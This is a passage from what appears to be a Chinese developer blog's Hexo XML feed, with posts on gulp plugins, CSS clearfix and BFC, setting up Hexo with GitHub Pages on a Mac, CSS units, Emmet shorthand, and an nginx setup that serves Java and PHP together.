<p>4、下载插件<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">sudo</span> npm install gulp-<span class="keyword">rev </span>gulp-<span class="keyword">rev-replace </span>gulp-useref gulp-filter gulp-uglify gulp-csso -g</div></pre></td></tr></table></figure></p>
<p><em>gulp-rev:添加文件版本号(哈希码) 
</em>gulp-rev-replace:Rewrite occurrences of filenames which have been renamed by gulp-rev<br><em>gulp-useref:合并css/js文件 
</em>gulp-filter:过滤筛选特定文件<br><em>gulp-uglify:压缩js代码 
</em>gulp-csso:压缩css代码</p>
]]></content>
      
        <categories>
            
            <category> Tools </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Gulp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[清除浮动]]></title>
      <url>/2017/03/11/Front%20End/%E6%B8%85%E9%99%A4%E6%B5%AE%E5%8A%A8/</url>
      <content type="html"><![CDATA[<p>当子元素设置为float后，父元素会出现高度塌陷，本文则是介绍如何解决浮动带来的影响<br><a id="more"></a></p>
<h2 id="一、增加一个无意义的空标签"><a href="#一、增加一个无意义的空标签" class="headerlink" title="一、增加一个无意义的空标签"></a>一、增加一个无意义的空标签</h2><p>在浮动元素后加一个div</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"container"</span>&gt;</div><div class="line">  &lt;<span class="keyword">div</span> <span class="built_in">class</span>=<span class="string">"float-content"</span>&gt;</div><div class="line">    Lorem ipsum dolor sit amet, consectetur </div><div class="line">    adipisicing elit. Distinctio, sapiente.</div><div class="line">  &lt;/<span class="keyword">div</span>&gt;</div><div class="line">  &lt;<span class="keyword">div</span> style=<span class="string">"clear: both"</span>&gt;&lt;/<span class="keyword">div</span>&gt;</div><div class="line">&lt;/<span class="keyword">div</span>&gt;</div></pre></td></tr></table></figure>
<p>但我们一般不想在代码里面用直接添加元素的方式清除浮动 </p>
<h2 id="二、给父元素增加一个overflow"><a href="#二、给父元素增加一个overflow" class="headerlink" title="二、给父元素增加一个overflow"></a>二、给父元素增加一个overflow</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">overflow</span>:hidden;<span class="comment">//auto也可</span></div></pre></td></tr></table></figure>
<h2 id="三、使用-after伪类元素"><a href="#三、使用-after伪类元素" class="headerlink" title="三、使用:after伪类元素"></a>三、使用:after伪类元素</h2><p>1、伪元素只有加了内容才能有效果。<br>2、IE6、7不支持伪元素，在IE6、7内有个hasLayout的概念，当元素的hasLayout属性值为true的时候会达到和BFC类似的效果。zoom:1 在IE6、7可以使hasLayout为true  </p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.clearfix</span>:after&#123;</div><div class="line">    <span class="attribute">content</span>: <span class="string">'.'</span>;</div><div class="line">    <span class="attribute">display</span>: block;</div><div class="line">    <span class="attribute">height</span>: <span class="number">0</span>;</div><div class="line">    <span class="attribute">clear</span>: both;</div><div class="line">    <span class="attribute">visibility</span>: hidden;</div><div class="line">&#125;</div><div class="line"><span class="selector-class">.clearfix</span>&#123; <span class="comment">/*兼容IE*/</span></div><div class="line">    *zoom: <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="四、BFC-Box、Formatting-Context"><a href="#四、BFC-Box、Formatting-Context" class="headerlink" title="四、BFC(Box、Formatting Context)"></a>四、BFC(Box、Formatting Context)</h2><p>块级格式化上下文：只要触发了BFC就可以清除浮动–闭合浮动，也就是预防高度塌陷（float，overflow，display，position）<br>加before伪类可以避免浏览器顶部的空白崩溃（margin-top margin-bottom的宽度会叠加，比如top bottom都是10，本应该是20，但会叠加变成10） </p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">:after</span>,</div><div class="line"><span class="selector-class">.claerfix</span><span class="selector-pseudo">:before</span>&#123;</div><div class="line">    <span class="attribute">content</span>: <span class="string">''</span>;</div><div class="line">    <span class="attribute">display</span>: table;</div><div class="line">&#125;</div><div class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">:after</span>&#123;</div><div class="line">    <span class="attribute">clear</span>: both;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Front End </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSS </tag>
            
            <tag> float </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[理解BFC]]></title>
      <url>/2017/03/11/Front%20End/BFC/</url>
      <content type="html"><![CDATA[<p>BFC深入理解<br><a id="more"></a><br><a href="http://www.cnblogs.com/lhb25/p/inside-block-formatting-ontext.html" target="_blank" rel="external">BFC原理</a><br><a href="http://www.zhangxinxu.com/wordpress/2015/02/css-deep-understand-flow-bfc-column-two-auto-layout/" target="_blank" rel="external">BFC特性</a></p>
<h2 id="Box"><a href="#Box" class="headerlink" title="Box"></a>Box</h2><p>CSS布局的基本单位<br>block-level box:display 属性为 block, list-item, table 的元素，会生成 block-level box。并且参与 block fomatting context;<br>inline-level box:display 属性为 inline, inline-block, inline-table 的元素，会生成 inline-level box。并且参与 inline formatting context; </p>
<h2 id="Formatting-context"><a href="#Formatting-context" class="headerlink" title="Formatting context"></a>Formatting context</h2><p>它是页面中的一块渲染区域，并且有一套渲染规则，它决定了其子元素将如何定位，以及和其他元素的关系和相互作用。最常见的 Formatting context 有 Block fomatting context (简称BFC)和 Inline formatting context (简称IFC)。<br>CSS3还有GFC,FFC. </p>
<h2 id="BFC"><a href="#BFC" class="headerlink" title="BFC"></a>BFC</h2><p>BFC(Block formatting context)直译为”块级格式化上下文”。它是一个独立的渲染区域，只有Block-level box参与， 它规定了内部的Block-level Box如何布局，并且与这个区域外部毫不相干。 </p>
<h2 id="BFC布局规则"><a href="#BFC布局规则" class="headerlink" title="BFC布局规则"></a>BFC布局规则</h2><p>1、内部的Box会在垂直方向，一个接一个地放置。<br>2、Box垂直方向的距离由margin决定。属于同一个BFC的两个相邻Box的margin会发生重叠。<br>3、每个元素的margin box的左边， 与包含块border box的左边相接触(对于从左往右的格式化，否则相反)。即使存在浮动也是如此。<br>4、BFC的区域不会与float box重叠。<br>5、BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此。<br>6、计算BFC的高度时，浮动元素也参与计算。 </p>
<h2 id="BFC生成"><a href="#BFC生成" class="headerlink" title="BFC生成"></a>BFC生成</h2><p>1、根元素<br>2、float属性不为none<br>3、position为absolute或fixed<br>4、display为inline-block, table-cell,table-caption, flex, inline-flex<br>5、overflow不为visible </p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>因为BFC内部的元素和外部的元素绝对不会互相影响，因此， 当BFC外部存在浮动时，它不应该影响BFC内部Box的布局，BFC会通过变窄，而不与浮动有重叠。同样的，当BFC内部有浮动时，为了不影响外部元素的布局，BFC计算高度时会包括浮动的高度。避免margin重叠也是这样的一个道理。 </p>
]]></content>
      
        <categories>
            
            <category> Front End </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSS </tag>
            
            <tag> BFC </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[How to install Hexo on Mac]]></title>
      <url>/2017/03/10/Mac/Hexo/</url>
      <content type="html"><![CDATA[<p>This is a brand new Hexo built in Mac OS X 10.10.<br>Get Started.  </p>
<a id="more"></a>  
<p>搭建步骤如下<br>1、注册GitHub账户<br>2、创建仓库<br>3、安装nodejs<br>4、安装git<br>5、安装Hexo<br>6、相关配置  </p>
<h2 id="一、注册GitHub账户"><a href="#一、注册GitHub账户" class="headerlink" title="一、注册GitHub账户"></a>一、注册GitHub账户</h2><p>1、如果你已经拥有GitHub账户，请跳过此步骤。<br>2、打开 <a href="https://github.com" target="_blank" rel="external">github</a> 点击 [Sign up fo GitHub] 按钮。注册成功后请牢记您的用户名和密码<br>3、登录GitHub。  </p>
<h2 id="二、创建仓库"><a href="#二、创建仓库" class="headerlink" title="二、创建仓库"></a>二、创建仓库</h2><p>1、登录GitHub之后点击 [ + New repository ] 按钮新建一个仓库，用来存储博客内容，这里Repository name 填写 [你的登录名].github.io 不能用别的名字。<br><img src="/images/github.png" alt="仓库创建"><br>2、填写完信息之后，点击[Create repository]按钮，完成创建。  </p>
<h2 id="三、安装nodejs"><a href="#三、安装nodejs" class="headerlink" title="三、安装nodejs"></a>三、安装nodejs</h2><p>1、因为Hexo是基于nodejs的，所以必须安装nodejs。<br>2、用homebrew安装</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ brew install <span class="keyword">node</span> <span class="title"></span></div></pre></td></tr></table></figure>
<h2 id="四、安装git"><a href="#四、安装git" class="headerlink" title="四、安装git"></a>四、安装git</h2><p>1、如果你已经安装了XCode，就不需要安装git了。<br>2、打开 <a href="http://git-scm.com/download/mac" target="_blank" rel="external">git</a> 下载git,并安装。  </p>
<h2 id="五、安装Hexo"><a href="#五、安装Hexo" class="headerlink" title="五、安装Hexo"></a>五、安装Hexo</h2><p>获得root权限</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$ </span>sudo passwd root</div><div class="line"><span class="variable">$ </span>su root</div></pre></td></tr></table></figure>
<p>1、在电脑中任意位置创建一个文件夹,用来存放博客文件。<br>2、打开终端输入 <code>npm install hexo-cli -g</code><br>3、建议使用安装 <code>npm install hexo --no-optional</code><br>4、Once Hexo is installed, run the following commands to initialise Hexo in the target <folder>.  </folder></p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$ </span>hexo init &lt;folder&gt;</div><div class="line"><span class="variable">$ </span>cd &lt;folder&gt;</div><div class="line"><span class="variable">$ </span>npm install</div><div class="line"><span class="variable">$ </span>hexo g</div><div class="line"><span class="variable">$ </span>npm install hexo-server --save</div><div class="line"><span class="variable">$ </span>hexo s</div></pre></td></tr></table></figure>    
<h2 id="六、连接github"><a href="#六、连接github" class="headerlink" title="六、连接github"></a>六、连接github</h2><p>1、设置个人信息  </p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ git config --global user<span class="selector-class">.name</span> <span class="string">"username"</span></div><div class="line">$ git config --global user<span class="selector-class">.email</span> <span class="string">"youremail"</span></div></pre></td></tr></table></figure>    
<p>2、在hexo根目录下_config.yml文件（xxxx为你的github账户名称）  </p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">deploy</span>:</div><div class="line">  <span class="attribute">type</span>: github</div><div class="line">  <span class="attribute">repo</span>: git<span class="variable">@github</span>.<span class="attribute">com</span>:xxxx/xxxx.github.io.git</div><div class="line">  <span class="attribute">branch</span>: master</div></pre></td></tr></table></figure>
<p>3、检查SSH key  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">cd</span> ~/.ssh</div></pre></td></tr></table></figure>
<p>4、生成SSH key</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ ssh-keygen -t rsa -C <span class="string">"xxxx@xxxx.com”</span></div></pre></td></tr></table></figure>
<p>5、复制SSH key</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">$</span> cd ~/.ssh</div><div class="line"><span class="symbol">$</span> ls</div><div class="line"><span class="symbol">$</span> cat id_rsa.pub</div></pre></td></tr></table></figure>
<p>6、将SSH key添加到github上并验证</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$ </span>ssh -T git<span class="variable">@github</span>.com</div></pre></td></tr></table></figure>
<p>7、上传hexo文件</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$ </span>npm install hexo-deployer-git --save</div><div class="line"><span class="variable">$ </span>hexo d</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Mac </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Mac </tag>
            
            <tag> Hexo </tag>
            
            <tag> Github </tag>
            
            <tag> Nodejs </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[px,em,rem详解]]></title>
      <url>/2017/03/10/Front%20End/%E5%83%8F%E7%B4%A0/</url>
      <content type="html"><![CDATA[<p>px,em,rem使用介绍</p>
<a id="more"></a>
<h2 id="px"><a href="#px" class="headerlink" title="px"></a>px</h2><p>px像素（Pixel）。相对长度单位。像素px是相对于显示器屏幕分辨率而言的。 </p>
<ol>
<li>IE无法调整那些使用px作为单位的字体大小； </li>
<li>国外的大部分网站能够调整的原因在于其使用了em或rem作为字体单位； </li>
<li>Firefox能够调整px和em，rem，但是96%以上的中国网民使用IE浏览器(或内核)。 </li>
</ol>
<h2 id="em"><a href="#em" class="headerlink" title="em"></a>em</h2><p>em是相对长度单位。相对于当前对象内文本的字体尺寸。如当前对行内文本的字体尺寸未被人为设置，则相对于浏览器的默认字体尺寸。 </p>
<ol>
<li>em的值并不是固定的； </li>
<li>em会继承父级元素的字体大小。 </li>
</ol>
<h2 id="rem"><a href="#rem" class="headerlink" title="rem"></a>rem</h2><p>rem是CSS3新增的一个相对单位（root em，根em），这个单位引起了广泛关注。这个单位与em有什么区别呢？区别在于使用rem为元素设定字体大小时，仍然是相对大小，但相对的只是HTML根元素。 </p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>一般浏览器默认为16px。<br>但为了使用方便会让html的font-size: 62.5%; 即1rem=10px;</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">html</span>&#123;</div><div class="line">    <span class="attribute">font-size</span>: <span class="number">62.5%</span>; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="小问题"><a href="#小问题" class="headerlink" title="小问题"></a>小问题</h2><p>1、发现chrome支持的最小px为12px。即使设置了62.5%的font-size，浏览器显示出来的字体大小1rem=12px。</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">-webkit-<span class="attribute">font-size</span>: <span class="number">12px</span>;</div><div class="line">-webkit-<span class="attribute">transform</span>: scale(<span class="number">0.84</span>);</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Front End </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Mac上用Navicat连接Oracle]]></title>
      <url>/2017/03/10/Database/navicat%E8%BF%9E%E6%8E%A5oracle/</url>
      <content type="html"><![CDATA[<p>在Mac上用Navicat连接Oracle的时候总是提示：ORA-21561: OID generation failed</p>
<a id="more"></a>
<h2 id="解决过程"><a href="#解决过程" class="headerlink" title="解决过程"></a>解决过程</h2><p>在终端上输入：~ hostname<br>localhost<br>查看/etc/hosts文件：~ cat /etc/hosts<br>127.0.0.1 localhost<br>保持hostname与hosts文件中127.0.0.1对应的名称一致即可！</p>
<p>========================================<br>修改hostname命令<br>sudo scutil –set HostName yourname</p>
]]></content>
      
        <categories>
            
            <category> database </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Oracle </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Emmet]]></title>
      <url>/2017/03/09/Tools/Emmet/</url>
      <content type="html"><![CDATA[<p>Emmet is a plugin for many popular text editors which greatly improves HTML &amp; CSS workflow<br><a id="more"></a></p>
<h2 id="一、-gt-用法"><a href="#一、-gt-用法" class="headerlink" title="一、&gt; 用法"></a>一、&gt; 用法</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">div</span>&gt;ul&gt;li</div><div class="line"><span class="section">&lt;div&gt;</span></div><div class="line">    <span class="section">&lt;ul&gt;</span></div><div class="line">        <span class="section">&lt;li&gt;</span><span class="section">&lt;/li&gt;</span></div><div class="line">    <span class="section">&lt;/ul&gt;</span></div><div class="line"><span class="section">&lt;/div&gt;</span></div></pre></td></tr></table></figure>
<h2 id="二、-用法"><a href="#二、-用法" class="headerlink" title="二、* 用法"></a>二、* 用法</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">div</span>&gt;ul&gt;li*3</div><div class="line"><span class="section">&lt;div&gt;</span></div><div class="line">    <span class="section">&lt;ul&gt;</span></div><div class="line">        <span class="section">&lt;li&gt;</span><span class="section">&lt;/li&gt;</span></div><div class="line">        <span class="section">&lt;li&gt;</span><span class="section">&lt;/li&gt;</span></div><div class="line">        <span class="section">&lt;li&gt;</span><span class="section">&lt;/li&gt;</span></div><div class="line">    <span class="section">&lt;/ul&gt;</span></div><div class="line"><span class="section">&lt;/div&gt;</span></div></pre></td></tr></table></figure>
<h2 id="三、-用法"><a href="#三、-用法" class="headerlink" title="三、+ 用法"></a>三、+ 用法</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">div</span>+p+div</div><div class="line"><span class="section">&lt;div&gt;</span><span class="section">&lt;/div&gt;</span></div><div class="line"><span class="section">&lt;p&gt;</span><span class="section">&lt;/p&gt;</span></div><div class="line"><span class="section">&lt;div&gt;</span><span class="section">&lt;/div&gt;</span></div></pre></td></tr></table></figure>
<h2 id="四、-用法"><a href="#四、-用法" class="headerlink" title="四、^ 用法"></a>四、^ 用法</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">div</span>&gt;ul^p</div><div class="line"><span class="section">&lt;div&gt;</span></div><div class="line">    <span class="section">&lt;ul&gt;</span><span class="section">&lt;/ul&gt;</span></div><div class="line"><span class="section">&lt;/div&gt;</span></div><div class="line"><span class="section">&lt;p&gt;</span><span class="section">&lt;/p&gt;</span></div></pre></td></tr></table></figure>
<h2 id="五、（）用法"><a href="#五、（）用法" class="headerlink" title="五、（）用法"></a>五、（）用法</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">(div&gt;ul&gt;li*3)+div</div><div class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
<h2 id="六、-用法"><a href="#六、-用法" class="headerlink" title="六、. 用法"></a>六、. 用法</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">div</span><span class="selector-class">.contain</span></div><div class="line">&lt;<span class="selector-tag">div</span> class=<span class="string">"contain"</span>&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
<h2 id="七、-用法"><a href="#七、-用法" class="headerlink" title="七、# 用法"></a>七、# 用法</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">div</span><span class="comment">#container</span></div><div class="line">&lt;<span class="keyword">div</span> <span class="built_in">id</span>=<span class="string">"container"</span>&gt;&lt;/<span class="keyword">div</span>&gt;</div></pre></td></tr></table></figure>
<h2 id="八、-用法"><a href="#八、-用法" class="headerlink" title="八、[] 用法"></a>八、[] 用法</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">div</span>[placeholder]</div><div class="line">&lt;<span class="selector-tag">div</span> placeholder=<span class="string">""</span>&gt;&lt;/div&gt;</div></pre></td></tr></table></figure>
<h2 id="九、-用法"><a href="#九、-用法" class="headerlink" title="九、{} 用法"></a>九、{} 用法</h2><figure class="highlight dust"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="xml">p</span><span class="template-variable">&#123;内容&#125;</span><span class="xml"></span></div><div class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div></pre></td></tr></table></figure>
<h2 id="十、-lorem-用法"><a href="#十、-lorem-用法" class="headerlink" title="十、 lorem 用法"></a>十、 lorem 用法</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">lorem3 <span class="comment">&lt;!--随机生成--&gt;</span></div><div class="line">Lorem ipsum dolor.</div></pre></td></tr></table></figure>
<h2 id="十一、-用法"><a href="#十一、-用法" class="headerlink" title="十一、$ 用法"></a>十一、$ 用法</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">div&gt;ul&gt;li.item$*3</div><div class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item1"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item2"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"item3"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Tools </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Emmet </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Java、PHP共用端口使用]]></title>
      <url>/2016/10/05/Linux/java%E5%92%8Cphp%E5%85%B1%E7%94%A8/</url>
      <content type="html"><![CDATA[<p>centos系统上，同时玩转Java和PHP<br><a id="more"></a><br>1、修改nginx.conf</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="section">server</span> &#123;</div><div class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</div><div class="line">    <span class="attribute">server_name</span> <span class="number">127.0.0.1</span>;   </div><div class="line">    <span class="attribute">access_log</span> /data/wwwlogs/access_nginx.log combined;</div><div class="line">    <span class="attribute">root</span> /data/wwwroot;</div><div class="line">    <span class="attribute">index</span> index.html index.htm index.jsp;</div><div class="line">    <span class="attribute">autoindex</span> <span class="literal">on</span>;</div><div class="line">    <span class="attribute">location</span> /nginx_status &#123;</div><div class="line">        <span class="attribute">stub_status</span> <span class="literal">on</span>;</div><div class="line">        <span class="attribute">access_log</span> <span class="literal">off</span>;</div><div class="line">        <span class="attribute">allow</span> <span class="number">127.0.0.1</span>;</div><div class="line">        <span class="attribute">deny</span> all;</div><div class="line">        &#125;</div><div class="line">    <span class="attribute">location</span> <span class="regexp">~ (\.jsp)|(\.do)$</span> &#123;</div><div class="line">         <span class="attribute">proxy_pass</span> http://127.0.0.1:8080;</div><div class="line">         <span class="attribute">proxy_redirect</span> <span class="literal">off</span>;</div><div class="line">         <span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</div><div class="line">         <span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</div><div class="line">         <span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</div><div class="line">        &#125;</div><div class="line">    <span class="attribute">location</span> <span class="regexp">~ [^/]\.php(/|$)</span> &#123;</div><div class="line">        <span class="comment">#fastcgi_pass remote_php_ip:9000;</span></div><div class="line">        <span class="attribute">fastcgi_pass</span> unix:/dev/shm/php-cgi.sock;</div><div class="line">        <span class="attribute">fastcgi_index</span> index.php;</div><div class="line">        <span class="attribute">include</span> fastcgi.conf;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    <span class="attribute">location</span> <span class="regexp">~ .*\.(gif|jpg|jpeg|png|bmp|swf|flv|ico)$</span> &#123;</div><div class="line">        <span class="attribute">expires</span> <span class="number">30d</span>;</div><div class="line">        <span class="attribute">access_log</span> <span class="literal">off</span>;</div><div class="line">        &#125;</div><div class="line">    <span class="attribute">location</span> <span class="regexp">~ .*\.(js|css)?$</span> &#123;</div><div class="line">        <span class="attribute">expires</span> <span class="number">7d</span>;</div><div class="line">        <span class="attribute">access_log</span> <span class="literal">off</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>2、修改localhost.xml</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;Host name=<span class="string">"localhost"</span> appBase=<span class="string">"/data/wwwroot"</span> unpackWARs=<span class="string">"true"</span> autoDeploy=<span class="string">"true"</span></div><div class="line">      &lt;Context path=<span class="string">""</span> docBase=<span class="string">"/data/wwwroot"</span> debug=<span class="string">"0"</span> reloadable=<span class="string">"false"</span> crossContext=<span class="string">"true"</span>/&gt;</div><div class="line">      &lt;Valve className=<span class="string">"org.apache.catalina.valves.AccessLogValve"</span> directory=<span class="string">"logs"</span> prefix=<span class="string">"localhost_access_log."</span> suffix=<span class="string">".txt"</span> pattern=<span class="string">"%h %l %u %t &amp;quot;%r&amp;quot; %s %b"</span> /&gt;</div><div class="line">&lt;<span class="regexp">/Host&gt;</span></div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Java </tag>
            
            <tag> PHP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Centos6.5 x86_64下 静默安装Oracle 11g R2]]></title>
      <url>/2016/05/01/Database/oracle11g%20silent%20install/</url>
      <content type="html"><![CDATA[<p>在linux下安装Oracle需要符合硬件和软件条件，蛮折腾的，我用的是阿里云的服务器，oneinstack一键安装包。<br><a id="more"></a></p>
